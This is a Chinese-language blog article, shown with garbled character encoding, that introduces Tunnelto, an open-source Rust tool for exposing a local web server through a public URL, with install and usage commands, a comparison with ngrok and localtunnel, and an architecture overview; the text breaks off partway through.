                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<blockquote>
<p>"å¦‚æœåªéœ€è¦ä¸€æ¡å‘½ä»¤ï¼Œå°±èƒ½è®©å…¨ä¸–ç•Œçš„ç”¨æˆ·è®¿é—®ä½ æœ¬åœ°è¿è¡Œçš„webæœåŠ¡å™¨ï¼Œé‚£è¯¥å¤šå¥½ï¼Ÿ"</p>
</blockquote>
<p>è¿™æ˜¯"ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®"ç³»åˆ—çš„ç¬¬13ç¯‡æ–‡ç« ã€‚ä»Šå¤©å¸¦ä½ äº†è§£çš„é¡¹ç›®æ˜¯ <strong>Tunnelto</strong>ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto" target="_blank" title="https://github.com/agrinman/tunnelto" ref="nofollow noopener noreferrer">GitHub</a>ï¼‰ã€‚</p>
<p>åœ¨å¼€å‘å’Œæµ‹è¯•webåº”ç”¨æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å°†æœ¬åœ°æœåŠ¡æš´éœ²ç»™å¤–éƒ¨è®¿é—®ï¼Œæ¯”å¦‚è®©è¿œç¨‹åŒäº‹æµ‹è¯•ã€é›†æˆç¬¬ä¸‰æ–¹webhookã€æˆ–è€…æ¼”ç¤ºç»™å®¢æˆ·ã€‚ä¼ ç»Ÿçš„è§£å†³æ–¹æ¡ˆè¦ä¹ˆé…ç½®å¤æ‚ï¼Œè¦ä¹ˆæ€§èƒ½ä¸ä½³ï¼Œè¦ä¹ˆéœ€è¦ä»˜è´¹ã€‚Tunneltoç”¨Rustæ‰“é€ ï¼ŒåŸºäºTokioå¼‚æ­¥IOï¼Œæä¾›äº†é«˜æ€§èƒ½ã€æ˜“ç”¨çš„å†…ç½‘ç©¿é€è§£å†³æ–¹æ¡ˆï¼Œè®©ä½ ç”¨ä¸€æ¡å‘½ä»¤å°±èƒ½å°†æœ¬åœ°æœåŠ¡æš´éœ²åˆ°äº’è”ç½‘ã€‚</p>
<h3 data-id="heading-1">ä½ å°†å­¦åˆ°ä»€ä¹ˆ</h3>
<ul>
<li>Tunneltoçš„æ ¸å¿ƒæ¶æ„å’ŒæŠ€æœ¯ç‰¹ç‚¹</li>
<li>å¦‚ä½•ä½¿ç”¨Tunneltoå¿«é€Ÿæš´éœ²æœ¬åœ°æœåŠ¡</li>
<li>Rustå¼‚æ­¥IOåœ¨ç½‘ç»œéš§é“ä¸­çš„åº”ç”¨</li>
<li>Tunneltoä¸å…¶ä»–å†…ç½‘ç©¿é€å·¥å…·çš„å¯¹æ¯”</li>
<li>å¦‚ä½•è‡ªæ‰˜ç®¡TunneltoæœåŠ¡å™¨</li>
<li>Tunneltoçš„é«˜çº§åŠŸèƒ½å’Œé…ç½®é€‰é¡¹</li>
<li>å®é™…å¼€å‘åœºæ™¯ä¸­çš„åº”ç”¨æ¡ˆä¾‹</li>
</ul>
<h3 data-id="heading-2">å‰ç½®çŸ¥è¯†</h3>
<ul>
<li>å¯¹ç½‘ç»œåŸºç¡€æœ‰åŸºæœ¬äº†è§£ï¼ˆTCP/IPã€HTTPï¼‰</li>
<li>äº†è§£æœ¬åœ°å¼€å‘æœåŠ¡å™¨çš„æ¦‚å¿µ</li>
<li>ç†Ÿæ‚‰å‘½ä»¤è¡Œå·¥å…·çš„ä½¿ç”¨</li>
<li>å¯¹Rustæœ‰åŸºæœ¬è®¤è¯†ï¼ˆå¯é€‰ï¼Œæœ‰åŠ©äºç†è§£å®ç°åŸç†ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-3">é¡¹ç›®èƒŒæ™¯</h2>
<h3 data-id="heading-4">é¡¹ç›®ç®€ä»‹</h3>
<p><strong>Tunnelto</strong> æ˜¯ä¸€ä¸ªç”¨<strong>Rustç¼–å†™çš„é«˜æ€§èƒ½å†…ç½‘ç©¿é€å·¥å…·</strong>ï¼Œè®©ä½ èƒ½å¤Ÿé€šè¿‡ä¸€æ¡ç®€å•çš„å‘½ä»¤ï¼Œå°†æœ¬åœ°è¿è¡Œçš„webæœåŠ¡å™¨æš´éœ²åˆ°äº’è”ç½‘ï¼Œè·å¾—ä¸€ä¸ªå…¬å…±å¯è®¿é—®çš„URLã€‚å®ƒå®Œå…¨åŸºäºå¼‚æ­¥IOï¼ˆTokioï¼‰ï¼Œæ€§èƒ½ä¼˜å¼‚ï¼ŒåŒæ—¶æ”¯æŒè‡ªå®šä¹‰å­åŸŸåå’Œè‡ªæ‰˜ç®¡éƒ¨ç½²ã€‚</p>
<p><strong>é¡¹ç›®è§£å†³çš„æ ¸å¿ƒé—®é¢˜</strong>ï¼š</p>
<ul>
<li>æœ¬åœ°å¼€å‘æœåŠ¡æ— æ³•è¢«å¤–éƒ¨è®¿é—®ï¼Œå½±å“åä½œå’Œæµ‹è¯•</li>
<li>ä¼ ç»Ÿå†…ç½‘ç©¿é€å·¥å…·é…ç½®å¤æ‚ã€æ€§èƒ½ä¸ä½³</li>
<li>éœ€è¦é›†æˆç¬¬ä¸‰æ–¹æœåŠ¡ï¼ˆå¦‚OAuthå›è°ƒã€Webhookï¼‰æ—¶æ— æ³•ä½¿ç”¨localhost</li>
<li>å•†ä¸šè§£å†³æ–¹æ¡ˆä»·æ ¼æ˜‚è´µæˆ–æœ‰é™åˆ¶</li>
<li>éœ€è¦è‡ªæ‰˜ç®¡è§£å†³æ–¹æ¡ˆä»¥ä¿æŠ¤éšç§å’Œæ•°æ®å®‰å…¨</li>
</ul>
<p><strong>é¢å‘çš„ç”¨æˆ·ç¾¤ä½“</strong>ï¼š</p>
<ul>
<li>Webå¼€å‘è€…å’Œå…¨æ ˆå·¥ç¨‹å¸ˆ</li>
<li>éœ€è¦å¿«é€Ÿæ¼”ç¤ºå’Œæµ‹è¯•çš„å¼€å‘è€…</li>
<li>éœ€è¦é›†æˆç¬¬ä¸‰æ–¹APIçš„å¼€å‘è€…</li>
<li>å¯¹æ€§èƒ½å’Œéšç§æœ‰è¦æ±‚çš„å¼€å‘è€…</li>
<li>éœ€è¦è‡ªæ‰˜ç®¡å†…ç½‘ç©¿é€æœåŠ¡çš„å›¢é˜Ÿ</li>
</ul>
<h3 data-id="heading-5">ä½œè€…/å›¢é˜Ÿä»‹ç»</h3>
<p><strong>ä½œè€…ï¼šAlex Grinman (@agrinman)</strong></p>
<ul>
<li><strong>èƒŒæ™¯</strong>ï¼šä¸“æ³¨äºç³»ç»Ÿç¼–ç¨‹å’Œç½‘ç»œæŠ€æœ¯çš„å¼€å‘è€…</li>
<li><strong>é¡¹ç›®åˆ›å»ºæ—¶é—´</strong>ï¼š2020å¹´</li>
<li><strong>ç†å¿µ</strong>ï¼šæ‰“é€ é«˜æ€§èƒ½ã€æ˜“ç”¨ã€å¯è‡ªæ‰˜ç®¡çš„å†…ç½‘ç©¿é€å·¥å…·</li>
<li><strong>æŠ€æœ¯æ ˆ</strong>ï¼šRustã€Tokioã€å¼‚æ­¥IO</li>
</ul>
<h3 data-id="heading-6">é¡¹ç›®æ•°æ®</h3>
<ul>
<li>â­ <strong>GitHub Stars</strong>: 5.7k+ï¼ˆæŒç»­å¢é•¿ï¼‰</li>
<li>ğŸ´ <strong>Forks</strong>: 432+</li>
<li>ğŸ“¦ <strong>ç‰ˆæœ¬</strong>: 0.1.18ï¼ˆæœ€æ–°ç‰ˆæœ¬ï¼Œ2021å¹´5æœˆ16æ—¥å‘å¸ƒï¼‰</li>
<li>ğŸ“„ <strong>License</strong>: MIT</li>
<li>ğŸŒ <strong>å®˜ç½‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftunnelto.dev" target="_blank" title="https://tunnelto.dev" ref="nofollow noopener noreferrer">tunnelto.dev</a></li>
<li>ğŸ’¬ <strong>ç¤¾åŒº</strong>: GitHub Issuesæ´»è·ƒ</li>
</ul>
<p><strong>é¡¹ç›®å‘å±•å†ç¨‹</strong>ï¼š</p>
<ul>
<li>2020å¹´ï¼šé¡¹ç›®åˆ›å»ºï¼Œå‘å¸ƒåˆå§‹ç‰ˆæœ¬</li>
<li>2020-2021å¹´ï¼šæŒç»­ä¼˜åŒ–ï¼Œæ·»åŠ æ–°åŠŸèƒ½</li>
<li>2021å¹´5æœˆï¼šå‘å¸ƒ0.1.18ç‰ˆæœ¬ï¼ŒåŠŸèƒ½ç¨³å®š</li>
<li>æŒç»­ç»´æŠ¤ï¼šé¡¹ç›®æŒç»­æ´»è·ƒï¼Œç¤¾åŒºè´¡çŒ®ä¸æ–­</li>
</ul>
<hr/>
<h2 data-id="heading-7">ä¸»è¦åŠŸèƒ½</h2>
<h3 data-id="heading-8">æ ¸å¿ƒä½œç”¨</h3>
<p>Tunneltoçš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>å°†æœ¬åœ°è¿è¡Œçš„webæœåŠ¡å™¨é€šè¿‡å…¬å…±URLæš´éœ²åˆ°äº’è”ç½‘</strong>ï¼Œä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>å¿«é€Ÿæš´éœ²æœ¬åœ°æœåŠ¡</strong>ï¼šä¸€æ¡å‘½ä»¤å³å¯å°†æœ¬åœ°ç«¯å£æ˜ å°„åˆ°å…¬å…±URL</li>
<li><strong>è‡ªå®šä¹‰å­åŸŸå</strong>ï¼šæ”¯æŒæŒ‡å®šè‡ªå®šä¹‰å­åŸŸåï¼Œæ–¹ä¾¿è®°å¿†å’Œä½¿ç”¨</li>
<li><strong>APIè®¤è¯</strong>ï¼šæ”¯æŒAPIå¯†é’¥è®¤è¯ï¼Œä¿æŠ¤éš§é“å®‰å…¨</li>
<li><strong>è‡ªæ‰˜ç®¡æ”¯æŒ</strong>ï¼šå¯ä»¥éƒ¨ç½²è‡ªå·±çš„TunneltoæœåŠ¡å™¨</li>
<li><strong>é«˜æ€§èƒ½</strong>ï¼šåŸºäºRustå’ŒTokioå¼‚æ­¥IOï¼Œæ€§èƒ½ä¼˜å¼‚</li>
<li><strong>æœ¬åœ°ä»ªè¡¨æ¿</strong>ï¼šæä¾›æœ¬åœ°ç›‘æ§å’Œè°ƒè¯•ç•Œé¢</li>
</ol>
<h3 data-id="heading-9">ä½¿ç”¨åœºæ™¯</h3>
<ol>
<li>
<p><strong>Webå¼€å‘æµ‹è¯•</strong></p>
<ul>
<li>è®©è¿œç¨‹å›¢é˜Ÿæˆå‘˜è®¿é—®æœ¬åœ°å¼€å‘ç¯å¢ƒ</li>
<li>åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šæµ‹è¯•å“åº”å¼è®¾è®¡</li>
<li>æ¼”ç¤ºç»™å®¢æˆ·æˆ–äº§å“ç»ç†</li>
</ul>
</li>
<li>
<p><strong>ç¬¬ä¸‰æ–¹æœåŠ¡é›†æˆ</strong></p>
<ul>
<li>OAuthå›è°ƒURLé…ç½®ï¼ˆGitHubã€Googleç­‰ï¼‰</li>
<li>Webhookæ¥æ”¶ï¼ˆStripeã€GitHub Actionsç­‰ï¼‰</li>
<li>ç¬¬ä¸‰æ–¹APIæµ‹è¯•å’Œè°ƒè¯•</li>
</ul>
</li>
<li>
<p><strong>APIå¼€å‘å’Œè°ƒè¯•</strong></p>
<ul>
<li>è®©å‰ç«¯å¼€å‘è€…è®¿é—®æœ¬åœ°APIæœåŠ¡</li>
<li>æµ‹è¯•ç§»åŠ¨åº”ç”¨ä¸åç«¯APIçš„é›†æˆ</li>
<li>è°ƒè¯•è·¨åŸŸé—®é¢˜</li>
</ul>
</li>
<li>
<p><strong>ä¸´æ—¶æ¼”ç¤ºå’Œåˆ†äº«</strong></p>
<ul>
<li>å¿«é€Ÿåˆ†äº«æœ¬åœ°é¡¹ç›®ç»™ä»–äºº</li>
<li>ä¸´æ—¶æ¼”ç¤ºå’ŒåŸå‹å±•ç¤º</li>
<li>æ— éœ€éƒ¨ç½²å³å¯å±•ç¤ºåŠŸèƒ½</li>
</ul>
</li>
<li>
<p><strong>CI/CDé›†æˆ</strong></p>
<ul>
<li>åœ¨CIç¯å¢ƒä¸­æš´éœ²æµ‹è¯•æœåŠ¡</li>
<li>è‡ªåŠ¨åŒ–æµ‹è¯•ä¸­çš„æœåŠ¡è®¿é—®</li>
<li>ä¸´æ—¶æµ‹è¯•ç¯å¢ƒæ­å»º</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">å¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-11">å®‰è£…æ–¹å¼</h4>
<p><strong>macOS (Homebrew)</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">brew install agrinman/tap/tunnelto
</code></pre>
<p><strong>Cargo (Rustç”¨æˆ·)</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">cargo install tunnelto
</code></pre>
<p><strong>å…¶ä»–å¹³å°</strong>:
ä» <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto%2Freleases" target="_blank" title="https://github.com/agrinman/tunnelto/releases" ref="nofollow noopener noreferrer">GitHub Releases</a> ä¸‹è½½å¯¹åº”å¹³å°çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<h4 data-id="heading-12">æœ€ç®€å•çš„ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æš´éœ²æœ¬åœ°8000ç«¯å£çš„æœåŠ¡</span>
tunnelto --port 8000
</code></pre>
<p>è¿è¡Œåï¼Œä½ ä¼šçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„è¾“å‡ºï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">ğŸš€ Starting tunnelto...
ğŸŒ Public URL: https:<span class="hljs-comment">//abc123.tunnelto.dev</span>
ğŸ“Š Dashboard: http:<span class="hljs-comment">//localhost:4040</span>
</code></pre>
<p>ç°åœ¨ï¼Œä»»ä½•äººéƒ½å¯ä»¥é€šè¿‡ <code>https://abc123.tunnelto.dev</code> è®¿é—®ä½ æœ¬åœ° <code>localhost:8000</code> çš„æœåŠ¡ã€‚</p>
<h4 data-id="heading-13">è‡ªå®šä¹‰å­åŸŸå</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰å­åŸŸå</span>
tunnelto --port 8000 --subdomain myapp
</code></pre>
<p>è¿™æ ·ä¼šç”Ÿæˆ <code>https://myapp.tunnelto.dev</code> çš„URLã€‚</p>
<h4 data-id="heading-14">æŒ‡å®šæœ¬åœ°ä¸»æœºå’Œåè®®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒ‡å®šæœ¬åœ°ä¸»æœºå’Œåè®®</span>
tunnelto --port 3000 --host 127.0.0.1 --scheme https
</code></pre>
<h3 data-id="heading-15">æ ¸å¿ƒç‰¹æ€§</h3>
<ol>
<li>
<p><strong>æç®€ä½¿ç”¨</strong></p>
<ul>
<li>ä¸€æ¡å‘½ä»¤å³å¯ä½¿ç”¨ï¼Œæ— éœ€å¤æ‚é…ç½®</li>
<li>è‡ªåŠ¨ç”Ÿæˆå…¬å…±URLï¼Œå¼€ç®±å³ç”¨</li>
<li>æ”¯æŒå¤šç§å®‰è£…æ–¹å¼</li>
</ul>
</li>
<li>
<p><strong>é«˜æ€§èƒ½å¼‚æ­¥IO</strong></p>
<ul>
<li>åŸºäºRustå’ŒTokioï¼Œæ€§èƒ½ä¼˜å¼‚</li>
<li>å¼‚æ­¥å¤„ç†ï¼Œæ”¯æŒé«˜å¹¶å‘è¿æ¥</li>
<li>ä½å»¶è¿Ÿï¼Œå“åº”è¿…é€Ÿ</li>
</ul>
</li>
<li>
<p><strong>è‡ªå®šä¹‰å­åŸŸå</strong></p>
<ul>
<li>æ”¯æŒæŒ‡å®šè‡ªå®šä¹‰å­åŸŸå</li>
<li>æ–¹ä¾¿è®°å¿†å’Œä½¿ç”¨</li>
<li>é€‚åˆç”Ÿäº§ç¯å¢ƒä½¿ç”¨</li>
</ul>
</li>
<li>
<p><strong>APIè®¤è¯</strong></p>
<ul>
<li>æ”¯æŒAPIå¯†é’¥è®¤è¯</li>
<li>ä¿æŠ¤éš§é“å®‰å…¨</li>
<li>é˜²æ­¢æœªæˆæƒè®¿é—®</li>
</ul>
</li>
<li>
<p><strong>æœ¬åœ°ä»ªè¡¨æ¿</strong></p>
<ul>
<li>æä¾›æœ¬åœ°ç›‘æ§ç•Œé¢</li>
<li>æŸ¥çœ‹è¯·æ±‚æ—¥å¿—å’Œç»Ÿè®¡</li>
<li>æ–¹ä¾¿è°ƒè¯•å’Œç›‘æ§</li>
</ul>
</li>
<li>
<p><strong>è‡ªæ‰˜ç®¡æ”¯æŒ</strong></p>
<ul>
<li>å¯ä»¥éƒ¨ç½²è‡ªå·±çš„æœåŠ¡å™¨</li>
<li>å®Œå…¨æ§åˆ¶æ•°æ®å’Œéšç§</li>
<li>æ”¯æŒåˆ†å¸ƒå¼éƒ¨ç½²ï¼ˆä½¿ç”¨Fly.ioï¼‰</li>
</ul>
</li>
<li>
<p><strong>å¤šåè®®æ”¯æŒ</strong></p>
<ul>
<li>æ”¯æŒHTTPå’ŒHTTPS</li>
<li>è‡ªåŠ¨å¤„ç†åè®®è½¬æ¢</li>
<li>çµæ´»é…ç½®</li>
</ul>
</li>
<li>
<p><strong>è·¨å¹³å°</strong></p>
<ul>
<li>æ”¯æŒmacOSã€Linuxã€Windows</li>
<li>æä¾›å¤šç§å®‰è£…æ–¹å¼</li>
<li>ç»Ÿä¸€çš„å‘½ä»¤è¡Œæ¥å£</li>
</ul>
</li>
</ol>
<h3 data-id="heading-16">é¡¹ç›®ä¼˜åŠ¿</h3>





















































<table><thead><tr><th align="left">å¯¹æ¯”é¡¹</th><th align="left">Tunnelto</th><th align="left">ngrok</th><th align="left">localtunnel</th></tr></thead><tbody><tr><td align="left"><strong>æ€§èƒ½</strong></td><td align="left">â­â­â­â­â­ Rustå¼‚æ­¥IO</td><td align="left">â­â­â­â­ Goå®ç°</td><td align="left">â­â­â­ Node.js</td></tr><tr><td align="left"><strong>æ˜“ç”¨æ€§</strong></td><td align="left">â­â­â­â­â­ ä¸€æ¡å‘½ä»¤</td><td align="left">â­â­â­â­ ç®€å•</td><td align="left">â­â­â­â­ ç®€å•</td></tr><tr><td align="left"><strong>è‡ªæ‰˜ç®¡</strong></td><td align="left">âœ… å®Œå…¨æ”¯æŒ</td><td align="left">âŒ éœ€è¦ä»˜è´¹</td><td align="left">âœ… æ”¯æŒä½†åŠŸèƒ½æœ‰é™</td></tr><tr><td align="left"><strong>è‡ªå®šä¹‰åŸŸå</strong></td><td align="left">âœ… å…è´¹æ”¯æŒ</td><td align="left">âŒ éœ€è¦ä»˜è´¹</td><td align="left">âŒ ä¸æ”¯æŒ</td></tr><tr><td align="left"><strong>å¼€æº</strong></td><td align="left">âœ… MIT</td><td align="left">âŒ éƒ¨åˆ†å¼€æº</td><td align="left">âœ… MIT</td></tr><tr><td align="left"><strong>èµ„æºå ç”¨</strong></td><td align="left">â­â­â­â­â­ æä½</td><td align="left">â­â­â­â­ è¾ƒä½</td><td align="left">â­â­â­ ä¸­ç­‰</td></tr><tr><td align="left"><strong>ç¤¾åŒºæ´»è·ƒåº¦</strong></td><td align="left">â­â­â­â­ æ´»è·ƒ</td><td align="left">â­â­â­â­â­ éå¸¸æ´»è·ƒ</td><td align="left">â­â­â­ ä¸€èˆ¬</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹©Tunneltoï¼Ÿ</strong></p>
<ul>
<li><strong>æ€§èƒ½ä¼˜å¼‚</strong>ï¼šRustå’ŒTokioçš„ç»„åˆå¸¦æ¥æä½³æ€§èƒ½ï¼Œé€‚åˆé«˜å¹¶å‘åœºæ™¯</li>
<li><strong>å®Œå…¨å¼€æº</strong>ï¼šMITè®¸å¯è¯ï¼Œä»£ç å®Œå…¨å¼€æ”¾ï¼Œå¯è‡ªç”±ä½¿ç”¨å’Œä¿®æ”¹</li>
<li><strong>è‡ªæ‰˜ç®¡å‹å¥½</strong>ï¼šæä¾›å®Œæ•´çš„è‡ªæ‰˜ç®¡æ–¹æ¡ˆï¼Œä¿æŠ¤éšç§å’Œæ•°æ®å®‰å…¨</li>
<li><strong>ç®€å•æ˜“ç”¨</strong>ï¼šä¸€æ¡å‘½ä»¤å³å¯ä½¿ç”¨ï¼Œå­¦ä¹ æˆæœ¬ä½</li>
<li><strong>èµ„æºå ç”¨ä½</strong>ï¼šRustç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½“ç§¯å°ï¼Œè¿è¡Œæ—¶å ç”¨èµ„æºå°‘</li>
<li><strong>æ´»è·ƒç»´æŠ¤</strong>ï¼šé¡¹ç›®æŒç»­æ›´æ–°ï¼Œç¤¾åŒºæ´»è·ƒ</li>
</ul>
<hr/>
<h2 data-id="heading-17">é¡¹ç›®è¯¦ç»†å‰–æ</h2>
<h3 data-id="heading-18">æ¶æ„è®¾è®¡</h3>
<p>Tunneltoé‡‡ç”¨<strong>å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¶æ„</strong>ï¼ŒåŒ…å«ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š</p>
<ol>
<li><strong>Tunnelto Client</strong>ï¼šè¿è¡Œåœ¨ç”¨æˆ·æœ¬åœ°çš„å®¢æˆ·ç«¯ï¼Œè´Ÿè´£å»ºç«‹éš§é“</li>
<li><strong>Tunnelto Server</strong>ï¼šè¿è¡Œåœ¨äº‘ç«¯çš„æœåŠ¡å™¨ï¼Œè´Ÿè´£è½¬å‘æµé‡</li>
<li><strong>Control WebSocket</strong>ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ§åˆ¶é€šé“</li>
</ol>
<h4 data-id="heading-19">æ ¸å¿ƒæ¨¡å—</h4>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Browser   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚ Tunnelto     â”‚â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚   Local     â”‚
â”‚  (Internet)  â”‚         â”‚   <span class="hljs-built_in">Server</span>     â”‚         â”‚   <span class="hljs-built_in">Server</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â–²
                              â”‚ Control WebSocket
                              â”‚
                        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                        â”‚   <span class="hljs-built_in">Client</span>    â”‚
                        â”‚  (Local)    â”‚
                        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å·¥ä½œæµç¨‹</strong>ï¼š</p>
<ol>
<li><strong>å»ºç«‹æ§åˆ¶è¿æ¥</strong>ï¼šå®¢æˆ·ç«¯é€šè¿‡WebSocketè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œå»ºç«‹æ§åˆ¶é€šé“</li>
<li><strong>æ³¨å†Œéš§é“</strong>ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨æ³¨å†Œéš§é“ï¼Œè·å¾—å…¬å…±URL</li>
<li><strong>æµé‡è½¬å‘</strong>ï¼šå½“æœ‰è¯·æ±‚åˆ°è¾¾å…¬å…±URLæ—¶ï¼ŒæœåŠ¡å™¨é€šè¿‡æ§åˆ¶é€šé“é€šçŸ¥å®¢æˆ·ç«¯</li>
<li><strong>å»ºç«‹æ•°æ®è¿æ¥</strong>ï¼šå®¢æˆ·ç«¯å»ºç«‹åˆ°æœ¬åœ°æœåŠ¡çš„è¿æ¥</li>
<li><strong>åŒå‘è½¬å‘</strong>ï¼šæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯åŒå‘è½¬å‘HTTPè¯·æ±‚å’Œå“åº”</li>
</ol>
<h3 data-id="heading-20">å…³é”®å®ç°</h3>
<h4 data-id="heading-21">å¼‚æ­¥IOæ¶æ„</h4>
<p>Tunneltoå®Œå…¨åŸºäº<strong>Tokioå¼‚æ­¥è¿è¡Œæ—¶</strong>ï¼Œå……åˆ†åˆ©ç”¨Rustçš„å¼‚æ­¥ç‰¹æ€§ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ä¼ªä»£ç ç¤ºä¾‹ï¼šæ ¸å¿ƒå¼‚æ­¥å¤„ç†é€»è¾‘</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">handle_tunnel_connection</span>(stream: TcpStream) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// å¼‚æ­¥å¤„ç†TCPè¿æ¥</span>
    <span class="hljs-keyword">let</span> (reader, writer) = stream.<span class="hljs-title function_ invoke__">split</span>();
    
    <span class="hljs-comment">// å¼‚æ­¥è¯»å–å’Œå†™å…¥</span>
    tokio::<span class="hljs-title function_ invoke__">spawn</span>(<span class="hljs-keyword">async</span> <span class="hljs-keyword">move</span> {
        <span class="hljs-comment">// å¤„ç†æ•°æ®è½¬å‘</span>
    });
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
